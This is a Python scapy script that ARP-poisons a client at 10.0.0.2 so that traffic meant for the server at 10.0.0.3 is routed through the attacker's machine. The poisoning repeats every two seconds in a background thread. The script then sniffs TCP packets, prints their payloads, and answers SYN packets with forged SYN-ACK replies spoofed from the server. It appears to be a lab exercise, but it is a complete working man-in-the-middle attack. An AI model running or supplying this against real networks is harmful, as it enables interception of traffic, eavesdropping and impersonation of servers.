from scapy.all import *
import os

IFACE = "eth0"

CLIENT_IP = "10.0.0.2"
SERVER_IP = "10.0.0.3"

MY_MAC = get_if_hwaddr(IFACE)
CLIENT_MAC = getmacbyip(CLIENT_IP)
SERVER_MAC = getmacbyip(SERVER_IP)

print("My MAC:     ", MY_MAC)
print("Client MAC: ", CLIENT_MAC)
print("Server MAC: ", SERVER_MAC)


# -------------------------------
# ARP poisoning
# -------------------------------

def poison():
    # Tell client: server IP is at my MAC
    poison_client = (
        Ether(dst=CLIENT_MAC) /
        ARP(
            op=2,
            psrc=SERVER_IP,
            hwsrc=MY_MAC,
            pdst=CLIENT_IP,
            hwdst=CLIENT_MAC
    ))

    sendp(poison_client, iface=IFACE, verbose=0)
    
def poison_loop():
    while True:
        poison()
        time.sleep(2)


threading.Thread(target=poison_loop, daemon=True).start()

print("ARP poisoning started")


# -----------------------------
syn_count = 0
sa_count = 0
a_count = 0

def handler(pkt):
    global syn_count
    global sa_count
    global a_count
    if IP in pkt and TCP in pkt:
        print(pkt.summary())
        print("TCP payload:", repr(bytes(pkt[TCP].payload)))
        if pkt[TCP].flags == 'S':
            packet = IP(src="10.0.0.3",dst="10.0.0.2")/TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags='SA',seq=5000,ack=pkt[TCP].seq + 1)
            send(packet)
        else:
            return

sniff(iface='eth0',prn=handler,store=False)
